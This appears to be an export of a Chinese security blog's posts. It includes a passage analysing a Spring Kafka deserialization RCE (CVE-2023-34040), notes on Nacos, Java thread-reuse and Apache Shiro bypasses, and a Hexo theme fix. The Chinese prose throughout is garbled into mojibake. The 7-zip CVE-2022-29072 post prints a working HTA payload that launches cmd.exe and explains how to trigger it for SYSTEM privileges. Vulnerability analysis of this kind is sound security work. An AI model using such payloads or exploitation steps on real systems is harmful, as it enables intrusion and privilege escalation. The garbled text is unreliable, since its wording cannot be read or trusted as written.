<p><code>Kafka</code>çš„ä¸€æ¡æ¶ˆæ¯æœ‰ä¸€äº›æ›´ç²¾ç»†çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬<code>Key</code>ã€<code>Value</code>ã€<code>Headers</code>ã€‚</p>
<ul>
<li>Keyï¼šå½“ä¸€æ¡æ¶ˆæ¯è¢«å®šä¹‰äº†Keyä¹‹åï¼ŒKafka Serveré€šè¿‡æ¶ˆæ¯Keyçš„hashï¼Œå°†ç›¸åŒKeyçš„æ¶ˆæ¯æ˜ å°„åˆ°åŒä¸€ä¸ªåˆ†åŒºä¸­ã€‚</li>
<li>Valueï¼šæ•°æ®</li>
<li>Headersï¼šå­˜å‚¨æ¶ˆæ¯å…ƒæ•°æ®ï¼Œheaderså†…å®¹å¯ä»¥è‡ªè¡Œå®šä¹‰ï¼Œç±»ä¼¼äºHTTPåè®®ä¸­çš„è‡ªå®šä¹‰æ¶ˆæ¯å¤´ï¼Œå½“ç„¶Kafkaä¸­ä¹Ÿæœ‰ä¸€äº›å†…éƒ¨çš„æ¶ˆæ¯å¤´ï¼Œè¯¥æ¼æ´å°±ä¸æ¶ˆæ¯å¤´æœ‰å…³</li>
</ul>
<p>å…³äº<code>Kafka</code>çš„åŸºç¡€æ¦‚å¿µè¿˜æœ‰å¾ˆå¤šï¼Œä½†å¯¹äºè¯¥æ¼æ´æ¥è¯´ï¼Œèƒ½å¤Ÿç†è§£ä¸Šè¿°æ¦‚å¿µå·²ç»è¶³å¤Ÿäº†ã€‚è‹¥éœ€è¦æ·±å…¥äº†è§£<code>Kafka</code>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š</p>
<p><a href="https://zhuanlan.zhihu.com/p/74063251">https://zhuanlan.zhihu.com/p/74063251</a></p>
<p>æˆ‘ä»¬è¿˜æ˜¯ä»å®˜æ–¹çš„é€šå‘Šå…¥æ‰‹ï¼š</p>
<p><a href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a></p>
<p><img src="/archives/6725ab5c/image-20230825135600387.png" alt="image-20230825135600387"></p>
<p>æ¼æ´æè¿°ä¸­æç¤ºäº†ä¸€äº›å…³é”®ä¿¡æ¯ï¼š</p>
<ul>
<li>å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ä¸º<code>3.x.0 &lt;= version &lt;= 3.0.9   2.x.0 &lt;= 2.9.10</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>3.0.10</code>ç‰ˆæœ¬æ˜¯ä¿®å¤ç‰ˆæœ¬ã€‚</li>
<li>å½“<code>Spring Kafka Consumer</code>æ²¡æœ‰é…ç½®<code>ErrorHandlingDeserializer </code>çš„æ—¶å€™å­˜åœ¨æ¼æ´</li>
<li>å½“<code>checkDeserExWhenKeyNull  </code>æˆ–è€…<code>checkDeserExWhenValueNull </code>è¢«è®¾ç½®ä¸º<code>True</code>æ—¶å­˜åœ¨æ¼æ´</li>
<li>å½“æ”»å‡»è€…å¯ä»¥ç”Ÿäº§æ¶ˆæ¯</li>
<li>å½“ä¸Šè¿°ä¸‰ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³æ—¶å¯èƒ½å­˜åœ¨æ¼æ´</li>
<li>æ”»å‡»å‘ç”Ÿåœ¨ç¨‹åºååºåˆ—åŒ–<code>Record Headers</code>çš„æ—¶å€™</li>
<li>ä½¿ç”¨äº†<code>ErrorHandlingDeserializer </code>å¯ä»¥é¿å…æ¼æ´ï¼Œå› ä¸ºå®ƒä¼šåˆ é™¤å±é™©çš„è®°å½•å¤´ã€‚</li>
</ul>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ°å®˜æ–¹ä»“åº“æ‰¾åˆ°æœ€æ–°å‘å¸ƒçš„æ¼æ´ä¿®å¤ç‰ˆæœ¬<code>v3.0.10</code>ï¼š</p>
<p><img src="/archives/6725ab5c/image-20230825140318666.png" alt="image-20230825140318666"></p>
<p>æ›´æ–°æ—¥å¿—æç¤ºäº†å¯èƒ½çš„æ¼æ´ä¿®å¤è®°å½•</p>
<p><a href="https://github.com/spring-projects/spring-kafka/pull/2770/files">https://github.com/spring-projects/spring-kafka/pull/2770/files</a></p>
<p>å¦å¤–ï¼Œåœ¨<code>ErrorHandlingDeserializer</code>ä¸­æ‰¾åˆ°å…¶ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šåˆ é™¤çš„<code>Record headers</code></p>
<p><img src="/archives/6725ab5c/image-20230825140629315.png" alt="image-20230825140629315"></p>
<p><img src="/archives/6725ab5c/image-20230825140646451.png" alt="image-20230825140646451"></p>
<p>ç”±æ­¤å¯çŸ¥ä¼šè¢«åˆ é™¤çš„<code>header</code>ä¸º<code>springDeserializerExceptionKey</code> ä¸<code>springDeserializerExceptionValue</code>ï¼Œè¿™ä¹Ÿæ„å‘³ç€æ¼æ´å¯èƒ½å°±å‘ç”Ÿåœ¨è¿™ä¸¤ä¸ª<code>header</code>çš„å€¼ä¸­ã€‚æ‰€ä»¥ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç”Ÿäº§æ¶ˆæ¯çš„æ—¶å€™ä¸ºæ¶ˆæ¯å¢åŠ è¿™ä¸¤ä¸ªæ¶ˆæ¯å¤´ã€‚</p>
<p><img src="/archives/6725ab5c/image-20230825141730204.png" alt="image-20230825141730204"></p>
<p>è¿™é‡Œæ¨¡æ‹Ÿäº†ç”¨æˆ·å‘é€<code>HTTP</code>è¯·æ±‚è®¾ç½®æ¶ˆæ¯çš„æƒ…å†µ</p>
<p><img src="/archives/6725ab5c/image-20230825141818830.png" alt="image-20230825141818830"></p>
<p>åœ¨å‰é¢æåˆ°çš„æ¼æ´å­˜åœ¨çš„æ¡ä»¶ä¸­ï¼Œæåˆ°éœ€è¦è®¾ç½®<code>checkDeserExWhenKeyNull</code>  æˆ–è€…<code>checkDeserExWhenValueNull</code>ä¸º<code>True</code>ï¼Œæˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°è¿™ä¸¤ä¸ªå˜é‡åœ¨<code>ConsumerProperties</code>ç±»ä¸­ã€‚é¡¾åæ€ä¹‰ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸æ¶ˆè´¹è€…ç›¸å…³çš„é…ç½®ã€‚</p>
<p><img src="/archives/6725ab5c/image-20230825142000043.png" alt="image-20230825142000043">  </p>
<p>è¿™ä¸¤ä¸ªé…ç½®éœ€è¦åœ¨åˆ›å»ºæ¶ˆè´¹è€…å®¹å™¨å·¥å‚çš„æ—¶å€™é…ç½®ä¸º<code>True</code>ï¼Œç°åœ¨æˆ‘ä»¬çš„æ¼æ´å¤ç°ç¯å¢ƒæ‰ç®—å®Œæ•´ã€‚</p>
<p><img src="/archives/6725ab5c/image-20230825142139127.png" alt="image-20230825142139127"></p>
<p>æˆ‘ä»¬åˆ°ä¸Šé¢æåˆ°çš„<code>commit</code>è®°å½•ä¸­æ‰¾åˆ°ä¸€ä¸ªæ–°å¢çš„æµ‹è¯•ç±»</p>
<p><img src="/archives/6725ab5c/image-20230825140825140.png" alt="image-20230825140825140"></p>
<p>è¿™ä¸ªæµ‹è¯•ç±»çš„åŠŸèƒ½å¤§æ¦‚æ˜¯æ¨¡æ‹Ÿäº†ä¸€æ¡æ¶ˆæ¯ï¼Œå…¶æºå¸¦äº†<code>Value</code>ç±»å‹çš„ååºåˆ—åŒ–å¼‚å¸¸æ¶ˆæ¯å¤´ï¼Œå³ï¼š<code>springDeserializerExceptionValue</code></p>
<p><img src="/archives/6725ab5c/image-20230825141001937.png" alt="image-20230825141001937"></p>
<p>ç„¶åé€šè¿‡è°ƒç”¨<code>SerializationUtils.getExceptionFromHeader</code>æ–¹æ³•æŸ¥çœ‹æ˜¯å¦èƒ½å¤Ÿè¿”å›ä¸€ä¸ª<code>Exception</code>å¯¹è±¡ï¼Œè‹¥ä¸èƒ½åˆ™æµ‹è¯•é€šè¿‡ã€‚åŒæ—¶æˆ‘ä»¬æ³¨æ„åˆ°è¯¥<code>commit</code>å¾ˆå¤šåœ°æ–¹å°†<code>ListenerUtils.getExceptionFromHeader</code>æ–¹æ³•æ›¿æ¢ä¸º<code>SerializationUtils.getExceptionFromHeader</code>æ–¹æ³•</p>
<p><img src="/archives/6725ab5c/image-20230825141159475.png" alt="image-20230825141159475"></p>
<p>é‚£ä¹ˆè¯æ˜<code>SerializationUtils.getExceptionFromHeader</code>æ–¹æ³•ä¸­å­˜åœ¨æ¼æ´çš„ä¿®å¤ï¼Œè€ŒæŒ‰ç…§åŸå§‹çš„é€»è¾‘æ‰§è¡Œä»£ç ä¼šå¯¼è‡´æ¼æ´ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°†æ–­ç‚¹æ‰“åœ¨<code>ListenerUtils.getExceptionFromHeader</code>å¤„è¿›è¡Œè°ƒè¯•ï¼š</p>
<p><img src="/archives/6725ab5c/image-20230825142315918.png" alt="image-20230825142315918"></p>
<p>è¿™ä¸ªæ—¶å€™å¯ä»¥é€šè¿‡<code>IDEA</code>æŸ¥çœ‹ä»¥ä¸‹ç¨‹åºçš„è°ƒç”¨æ ˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">checkDeser:<span class="number">2766</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeOnMessage:<span class="number">2648</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">doInvokeRecordListener:<span class="number">2577</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">doInvokeWithRecords:<span class="number">2457</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeRecordListener:<span class="number">2335</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeListener:<span class="number">2006</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeIfHaveRecords:<span class="number">1375</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">pollAndInvoke:<span class="number">1366</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">run:<span class="number">1257</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">call:<span class="number">511</span>, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run$$$capture:<span class="number">266</span>, FutureTask (java.util.concurrent)</span><br><span class="line">run:-<span class="number">1</span>, FutureTask (java.util.concurrent)</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¬¬8è¡Œçš„ä»£ç é€»è¾‘ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œåœ¨<code>doPoll</code>æ–¹æ³•ä¸­ä¼šå®Œæˆæ¶ˆæ¯çš„ååºåˆ—åŒ–å¾—åˆ°<code>records</code>å¯¹è±¡ï¼Œè¿™ä¸­é—´éœ€è¦ä¿è¯æ¶ˆæ¯æ‹¥æœ‰æ­£ç¡®çš„æ•°æ®æ ¼å¼ä»¥é¿å…å‘ç”Ÿå¼‚å¸¸å¯¼è‡´ç¨‹åºä¸èƒ½è¿è¡Œåˆ°ç¬¬<code>1366</code>è¡Œ<code>invokeIfHaveRecords</code>æ–¹æ³•å¤„ï¼Œæ‰€è°“<code>invokeIfHaveRecords</code>å³åœ¨æ¶ˆè´¹è€…æˆåŠŸè·å–åˆ°æ¶ˆæ¯å¹¶ååºåˆ—åŒ–åè°ƒç”¨ç¨‹åºä¸­è®¾ç½®çš„ç›‘å¬å™¨å›è°ƒè¿›è¡Œè·Ÿè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œå³è¢«<code>KafkaListener</code>æ³¨è§£ä¿®é¥°çš„é€»è¾‘çš„å¤„ç†é€»è¾‘ï¼Œä¸è¿‡åœ¨è¿›è¡Œè¿™æ­¥æ“ä½œå‰åŒ…å«ä¸€äº›å¿…è¦çš„æ£€æµ‹ï¼Œå¦‚ï¼šè®°å½•<code>Headers</code>å…ƒæ•°æ®çš„æ£€æŸ¥ã€‚</p>
<p><img src="/archives/6725ab5c/image-20230825142705028.png" alt="image-20230825142705028"></p>
<p>å›åˆ°<code>ListenerUtils.getExceptionFromHeader</code>çš„è°ƒç”¨é€»è¾‘ã€‚è¯¥æ–¹æ³•é¦–å…ˆåœ¨<code>104</code>è¡Œå¤„è·å–åˆ°è®°å½•headersèƒ½å¤Ÿä¸<code>headerName</code> å˜é‡å€¼<code>springDeserializerExceptionKey</code>åŒ¹é…çš„å¤´ä¿¡æ¯ã€‚ç„¶åå°†è¯¥æ ‡å¤´çš„å€¼å–å‡ºæ¥è°ƒç”¨<code>byteArrayToDeserializationException</code>æ–¹æ³•</p>
<p><img src="/archives/6725ab5c/image-20230825143236166.png" alt="image-20230825143236166"></p>
<p>åœ¨<code>byteArrayToDeserializationException</code>æ–¹æ³•ä¸­æœ‰å…¸å‹çš„ååºåˆ—åŒ–é€»è¾‘ï¼Œä¸è¿‡å› ä¸ºè¯¥éƒ¨åˆ†ä»£ç é‡å†™äº†<code>resolveClass</code>æ–¹æ³•é™åˆ¶äº†ååºåˆ—åŒ–ç›®æ ‡ç±»çš„å…¨ç±»åå¿…é¡»ä¸º<code>org.springframework.kafka.support.serializer.DeserializationException</code> æ‰€ä»¥ä¸èƒ½è¿›è¡Œä»»æ„ç±»çš„ååºåˆ—åŒ–ã€‚</p>
<p><img src="/archives/6725ab5c/image-20230825143426712.png" alt="image-20230825143426712"></p>
<p><code>DeserializationException</code>å«æœ‰ä¸€ä¸ªæœ‰å‚æ„é€ æ–¹æ³•ï¼Œå…¶æ¥å—<code>4</code>ä¸ªå‚æ•°åˆ†åˆ«è¡¨ç¤ºå¼‚å¸¸æç¤ºä¿¡æ¯ã€å¼‚å¸¸æ•°æ®ã€æ˜¯å¦æ˜¯<code>key</code>ååºåˆ—åŒ–å¼‚å¸¸ä»¥åŠå¯¼è‡´å¼‚å¸¸çš„åŸå› </p>
<p><img src="/archives/6725ab5c/image-20230825143718977.png" alt="image-20230825143718977"></p>
<p>ç¬¬å››ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ç±»å‹æ˜¯ä¸€ä¸ªé¡¶çº§çš„å¼‚å¸¸æ¥å£ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªå…¶å®ç°ç±»å«æœ‰å¯è¢«åˆ©ç”¨çš„ä»£ç ï¼Œä¾¿å¯è¿›è¡Œååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘ä»¬è‡ªè¡Œç¼–å†™äº†ä¸€ä¸ªå¼‚å¸¸ç±»ï¼Œè¯¥å¼‚å¸¸ç±»åœ¨è¢«åŠ è½½çš„æ—¶å€™ä¾¿ä¼šæ‰§è¡Œé™æ€ä»£ç å—ä¸­çš„ä»£ç ã€‚</p>
<p><img src="/archives/6725ab5c/image-20230825144018653.png" alt="image-20230825144018653"></p>
<p>ä½¿ç”¨ä»¥ä¸‹ä»£ç ç”Ÿæˆåºåˆ—åŒ–æ•°æ®</p>
<p><img src="/archives/6725ab5c/image-20230825144234496.png" alt="image-20230825144234496"></p>
<p>å°†è¯¥æ•°æ®é€šè¿‡<code>send</code>æ¥å£å‘é€ç»™<code>kafka</code>æœåŠ¡å™¨</p>
<p><img src="/archives/6725ab5c/image-20230825144326564.png" alt="image-20230825144326564"></p>
<p>æˆåŠŸ<code>RCE</code></p>
<p><img src="/archives/6725ab5c/image-20230825144409214.png" alt="image-20230825144409214"></p>
<p>å¯ä»¥æ³¨æ„åˆ°ï¼Œè¯¥æ¼æ´åˆ©ç”¨é™åˆ¶å¾ˆå¤šã€‚å¾ˆå¤šé…ç½®éƒ½å¹¶ä¸æ˜¯å¸¸ç”¨é…ç½®ï¼Œæ‰€ä»¥è®²åˆ°å±å®³å…¶å®æ˜¯æœ‰é™çš„ã€‚ååºåˆ—åŒ–çš„ç›®æ ‡å¯¹è±¡ä¼šåœ¨ç¬¬ä¸€æ¬¡è¢«å‘åºåˆ—åŒ–åè¢«ç¼“å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥å¤ç°æ—¶å¯èƒ½ä¼šå‡ºç°ç¬¬ä¸€æ¬¡æˆåŠŸï¼Œåé¢æµ‹è¯•ä¸æˆåŠŸçš„ç°è±¡ã€‚</p>
<p>å¦å¤–ï¼Œæ­¤å¤„æˆ‘ä»¬ç”¨çš„æ˜¯è‡ªå®šä¹‰çš„å¼‚å¸¸ç±»ï¼Œé‚£ä¹ˆåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¿™ç±»<code>Gadgets</code>æ€ä¹ˆæ‰¾å‘¢ï¼Ÿå…¶å®å¯ä»¥å‚è€ƒä¸‹<code>FastJSON V1.2.80</code>é‚£ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œå…¶åˆ©ç”¨çš„<code>Gadgets</code>å°±æ˜¯ä¸€äº›å®ç°äº†<code>Throwable</code>æ¥å£çš„å¼‚å¸¸ç±»ã€‚</p>
<h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><ol>
<li>å‡çº§è½¯ä»¶åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬æˆ–æœ€æ–°ç‰ˆï¼Œå®˜æ–¹ä»“åº“åœ°å€ï¼š<a href="https://github.com/spring-projects/spring-kafka/releases%EF%BC%9B">https://github.com/spring-projects/spring-kafka/releasesï¼›</a></li>
<li>è§„èŒƒç¼–ç ï¼Œé¿å…ä¸å—ä¿¡ä»»ç”¨æˆ·ç¼–è¾‘æ¶ˆæ¯å…ƒæ•°æ®ï¼›</li>
<li>é…ç½®<code>ErrorHandlingDeserializer</code>è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚</li>
</ol>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34040">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34040</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-34040">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-34040</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34040">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34040</a></li>
<li><a href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a></li>
<li><a href="https://github.com/spring-projects/spring-kafka/pull/2770/files">https://github.com/spring-projects/spring-kafka/pull/2770/files</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>æ¼æ´</tag>
        <tag>Spring Kafka</tag>
        <tag>CVE-2023-34040</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ¡ä»¶ç«äº‰RCE</title>
    <url>/archives/2d3cd237.html</url>
    <content><![CDATA[<p><a href="https://uzzju.com/post/87.java">https://uzzju.com/post/87.java</a><br><a href="https://rivers.chaitin.cn/blog/cqcu0eh0lnee0vjd59i0">https://rivers.chaitin.cn/blog/cqcu0eh0lnee0vjd59i0</a></p>
]]></content>
  </entry>
  <entry>
    <title>Javaçº¿ç¨‹å¤ç”¨å¯¼è‡´çš„è®¤è¯ç»•è¿‡</title>
    <url>/archives/59540e36.html</url>
    <content><![CDATA[<h1 id="çº¿ç¨‹æ± å¤ç”¨TreadLocal"><a href="#çº¿ç¨‹æ± å¤ç”¨TreadLocal" class="headerlink" title="çº¿ç¨‹æ± å¤ç”¨TreadLocal"></a>çº¿ç¨‹æ± å¤ç”¨TreadLocal</h1><h1 id="é™æ€å˜é‡æœªåŒæ­¥"><a href="#é™æ€å˜é‡æœªåŒæ­¥" class="headerlink" title="é™æ€å˜é‡æœªåŒæ­¥"></a>é™æ€å˜é‡æœªåŒæ­¥</h1><h1 id="ç¼“å­˜å¤„ç†ä¸å½“"><a href="#ç¼“å­˜å¤„ç†ä¸å½“" class="headerlink" title="ç¼“å­˜å¤„ç†ä¸å½“"></a>ç¼“å­˜å¤„ç†ä¸å½“</h1><p>tomcat rce</p>
<h1 id="å¼‚æ­¥æ“ä½œå¤„ç†ä¸å½“"><a href="#å¼‚æ­¥æ“ä½œå¤„ç†ä¸å½“" class="headerlink" title="å¼‚æ­¥æ“ä½œå¤„ç†ä¸å½“"></a>å¼‚æ­¥æ“ä½œå¤„ç†ä¸å½“</h1><p>nacos rce</p>
]]></content>
  </entry>
  <entry>
    <title>è§£å†³hexo-nextä¸»é¢˜ä¸Šæ¸¸ä»“åº“æ”¹å˜å‘Šè­¦</title>
    <url>/archives/cf1ba47f.html</url>
    <content><![CDATA[<p>æ‰¾åˆ°å®‰è£…çš„<code>hexo-next-title hexo-next-share hexo-next-exif hexo-next-utteranc</code>ç­‰æ’ä»¶çš„å®‰è£…ç›®å½• åœ¨å…¶ç›®å½•ä¸‹æ‰¾åˆ°<code>node_modules</code>ç›®å½•<br>è§‚å¯Ÿæ˜¯å¦å­˜åœ¨ <code>next-util</code> ç›®å½•ï¼Œè‹¥å­˜åœ¨æ‰“å¼€è¯¥ç›®å½•ä¸­çš„<code>index.js</code>è¿›è¡Œä¿®æ”¹<br>æ³¨é‡Šè°ƒæ·»åŠ çš„<code>before_generate</code>è¿‡æ»¤å™¨  </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> yaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; merge &#125; = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">hexo, pluginDir</span>) &#123;</span><br><span class="line">  hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;before_generate&#x27;</span>, <span class="keyword">function</span> <span class="title function_">err</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//hexo.log.warn(`The upstream repository of theme NexT has been changed.`);</span></span><br><span class="line">    <span class="comment">//hexo.log.warn(`For more information: https://github.com/next-theme/hexo-theme-next`);</span></span><br><span class="line">    <span class="comment">//hexo.log.warn(`Documentation: https://theme-next.js.org`);</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">hexo</span> = hexo;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">pluginDir</span> = pluginDir;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getFilePath</span> = <span class="keyword">function</span>(<span class="params">file</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">pluginDir</span> ? path.<span class="title function_">resolve</span>(<span class="variable language_">this</span>.<span class="property">pluginDir</span>, file) : file;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getFileContent</span> = <span class="keyword">function</span>(<span class="params">file</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> fs.<span class="title function_">readFileSync</span>(<span class="variable language_">this</span>.<span class="title function_">getFilePath</span>(file), <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">defaultConfigFile</span> = <span class="keyword">function</span>(<span class="params">key, file</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> defaultConfig = file ? yaml.<span class="title function_">safeLoad</span>(<span class="variable language_">this</span>.<span class="title function_">getFileContent</span>(file)) : &#123;&#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">config</span>[key] = <span class="title function_">merge</span>(defaultConfig[key], <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">theme</span>.<span class="property">config</span>[key], <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">config</span>[key]);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">config</span>[key];</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bugä¿®å¤</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>hexo-next</tag>
        <tag>The upstream repository of theme NexT has been changed</tag>
      </tags>
  </entry>
  <entry>
    <title>7-zipæƒé™æå‡æ¼æ´ã€CVE-2022-29072ã€‘</title>
    <url>/archives/e8630e46.html</url>
    <content><![CDATA[<p>è¿™ç©æ„å„¿å¾ˆç®€å•ï¼ŒåŸç†ä¸æ¸…æ¥šï¼Œä¸è¿‡7-zipå®˜æ–¹å¹¶ä¸æ‰¿è®¤è¿™ä¸ªæ¼æ´ï¼Œä»–ä»¬è¯´è¿™ä¸ªæ´æ˜¯å¾®è½¯çš„é”…ï¼Œä¸è¿‡æˆ‘çœ‹ä¹Ÿç¡®å®æ˜¯ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">&quot;7zipcodeexec&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;jscript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> c = <span class="string">&quot;cmd.exe&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;WScript.Shell&#x27;</span>).<span class="title class_">Run</span>(c);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ‰¾ä¸ªæ–‡æœ¬æ–‡ä»¶æŠŠä¸Šé¢çš„å†…å®¹å†™è¿›å»ï¼Œç„¶åè®²åç¼€åæ”¹ä¸º7zã€‚ç„¶åè®²è¿™ä¸ªæ–‡ä»¶æ‹–åŠ¨åˆ°7zipçš„helperçª—å£ä¸­å°±ä¼šå¼¹å‡ºDOSçª—å£ï¼ŒæŸ¥çœ‹å½“å‰æƒé™å¯ä»¥çœ‹åˆ°ä¸ºsystemæƒé™</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>æƒé™æå‡</tag>
        <tag>7-zip</tag>
        <tag>CVE-2022-29072</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Shiro RegExPatternMatcher è®¤è¯ç»•è¿‡ã€CVE-2022-32532ã€‘</title>
    <url>/archives/9f1a1388.html</url>
    <content><![CDATA[<p>åˆ©ç”¨äº†æ­£åˆ™å…ƒå­—ç¬¦<code>.</code>é»˜è®¤ä¸èƒ½åŒ¹é…æ¢è¡Œç¬¦çš„ç‰¹æ€§ç»•è¿‡äº†æƒé™æ£€æŸ¥æ­¥éª¤ï¼Œä½†å› ä¸ºåœ¨è·¯å¾„ä¸­æ’å…¥äº†ç©ºç™½å­—ç¬¦æ„é€ çš„è·¯å¾„æ˜¯ç•¸å½¢çš„ä¸ä¸€å®šèƒ½å¤ŸåŒ¹é…åˆ°æœ‰æ•ˆçš„è·¯å¾„ï¼Œ<br>é™¤éåç»­æ­¥éª¤ä¸­æœ‰è¿‡ç¨‹å¤„ç†æ‰è¯¥ç©ºç™½å­—ç¬¦ï¼Œå°±æƒ³å½“åˆçš„å¦ä¸€ä¸ªshiro æƒé™ç»•è¿‡ä¸€æ ·<code>..;</code>ï¼Œåˆ©ç”¨äº†spring bootçš„ç‰¹æ€§å°†<code>..;</code>å»æ‰äº†ï¼Œå¹¶æœ‰ç›®å½•ç©¿è¶Šã€‚<br>å‰æ®µæ—¶é—´çš„spring securityæ®è¯´ä¹Ÿæ˜¯åˆ©ç”¨è¿™ä¸ªåŸç†å®ç°çš„ç»•è¿‡ï¼Œåªèƒ½è¯´é›·å£°å¤§é›¨ç‚¹å°ã€‚ä¿®å¤çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•æ— éå°±æ˜¯è®©<code>.</code>èƒ½å¤ŸåŒ¹é…åˆ°æ¢è¡Œç¬¦å°±okäº†ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
